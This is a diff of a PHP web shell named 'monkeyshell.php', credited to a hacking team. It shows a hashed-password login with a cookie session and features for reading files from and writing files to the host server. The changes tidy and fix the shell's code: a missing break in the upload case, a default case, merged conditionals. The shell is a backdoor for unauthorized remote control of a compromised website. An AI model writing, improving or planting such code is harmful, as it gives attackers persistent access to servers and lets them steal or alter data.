@@ -1,18 +1,18 @@
 <?php
+
 //Author : MAK'HACK TEAM
 
 
 // Change this
 // $md5pass = "00bd542d259ffb1362201ea1bd3c12df";
 $md5pass = "792287063315eab7e08b10f8dd349ded";
-if (isset($_POST['hiddenpass'])) {
-    if (md5(md5(md5($_POST['hiddenpass']))) == $md5pass) {
-        setcookie('log', md5(md5(md5(md5($_POST['hiddenpass'])))), time() + 60 * 60 * 12, "/");
-        header('Location: monkeyshell.php');
-    }
+if (isset($_POST['hiddenpass']) && md5(md5(md5($_POST['hiddenpass']))) == $md5pass) {
+    setcookie('log', md5(md5(md5(md5($_POST['hiddenpass'])))), time() + 60 * 60 * 12, "/");
+    header('Location: monkeyshell.php');
+    
 }
 
-if ((isset($_POST['logout'])) or (isset($_GET['logout']))) {
+if ((isset($_POST['logout'])) || (isset($_GET['logout']))) {
     setcookie('log', '', time() - 7000000, "/");
     header('Location: monkeyshell.php');
 }
@@ -161,7 +161,7 @@ if ((isset($_COOKIE['log'])) && ($_COOKIE['log'] == md5($md5pass))) {
     function featureDownload($filePath)
     {
         $file = @file_get_contents($filePath);
-        if ($file === FALSE) {
+        if ($file === false) {
             return array(
                 'stdout' => array('File not found / no read permission.'),
                 'cwd' => getcwd()
@@ -178,7 +178,7 @@ if ((isset($_COOKIE['log'])) && ($_COOKIE['log'] == md5($md5pass))) {
     {
         chdir($cwd);
         $f = @fopen($path, 'wb');
-        if ($f === FALSE) {
+        if ($f === false) {
             return array(
                 'stdout' => array('Invalid path / no write permission.'),
                 'cwd' => getcwd()
@@ -213,9 +213,15 @@ if ((isset($_COOKIE['log'])) && ($_COOKIE['log'] == md5($md5pass))) {
                 break;
             case 'upload':
                 $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
+                break;
             case 'download':
                 $response = featureDownload($_POST['path']);
                 break;
+            default:
+                $response = array(
+                    'stdout' => array('Invalid feature.'),
+                    'cwd' => getcwd()
+                );
         }
 
         header("Content-Type: application/json");
@@ -644,4 +650,3 @@ if ((isset($_COOKIE['log'])) && ($_COOKIE['log'] == md5($md5pass))) {
     XML;
 
 }
-?>
